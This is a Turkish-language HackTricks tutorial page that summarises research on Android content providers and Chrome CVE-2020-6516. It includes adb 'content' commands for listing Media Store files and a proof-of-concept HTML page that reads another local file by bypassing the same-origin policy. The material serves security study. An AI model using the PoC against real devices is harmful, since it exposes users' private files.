<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


**Bu, [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/) adlı yazının özeti.**

### Medya Deposunda Dosyaları Listeleme
Medya Deposu tarafından yönetilen dosyaları listelemek için aşağıdaki komut kullanılabilir:
```bash
$ content query --uri content://media/external/file
```
Daha insan dostu bir çıktı için, yalnızca her dizinlenmiş dosyanın tanımlayıcısını ve yolunu görüntüleyin:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
İçerik sağlayıcılar kendi özel ad alanlarında izole edilir. Bir sağlayıcıya erişim, belirli bir `content://` URI gerektirir. Bir sağlayıcıya erişmek için yol bilgileri, uygulama manifestlerinden veya Android çerçevesinin kaynak kodundan elde edilebilir.

### Chrome'un İçerik Sağlayıcılara Erişimi
Android'deki Chrome, `content://` şeması aracılığıyla içerik sağlayıcılara erişebilir ve üçüncü taraf uygulamalar tarafından dışa aktarılan fotoğraf veya belgeler gibi kaynaklara erişebilir. Bunun örneğini vermek için, bir dosya Medya Deposuna eklenir ve ardından Chrome üzerinden erişilir:

Medya Deposuna özel bir giriş ekleyin:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Yeni eklenen dosyanın tanımlayıcısını keşfedin:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Dosya, dosyanın tanımlayıcısıyla oluşturulan bir URL kullanılarak Chrome'da görüntülenebilir.

Örneğin, belirli bir uygulamayla ilgili dosyaları listelemek için:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

_Same Origin Policy_ (SOP), tarayıcılarda web sayfalarının farklı kökenlere ait kaynaklarla etkileşimini, Cross-Origin-Resource-Sharing (CORS) politikası tarafından açıkça izin verilmediği sürece kısıtlayan bir güvenlik protokolüdür. Bu politika, bilgi sızıntılarını ve cross-site request forgery'yi önlemeyi amaçlar. Chrome, `content://`'yi yerel bir şema olarak kabul eder ve her bir yerel şema URL'sinin ayrı bir köken olarak işlem gördüğü daha sıkı SOP kuralları uygular.

Ancak, CVE-2020-6516, Chrome'da `content://` URL'si aracılığıyla yüklenen kaynaklar için SOP kurallarının atlanmasına izin veren bir güvenlik açığıydı. Bu açık sayesinde, `content://` URL'si üzerinden yüklenen JavaScript kodu, özellikle Android 10'dan önceki sürümlerde kapsamlı depolama uygulanmadığı için önemli bir güvenlik endişesi olan diğer `content://` URL'si üzerinden yüklenen kaynaklara erişebiliyordu.

Aşağıdaki örnek, bu güvenlik açığını göstermektedir. Bir HTML belgesi, **/sdcard** altına yüklendikten sonra Medya Deposuna eklenir ve JavaScript'te `XMLHttpRequest` kullanarak Medya Deposundaki başka bir dosyanın içeriğine erişir ve içeriğini görüntüler. Bu sayede SOP kurallarını atlamış olur.

Örnek HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
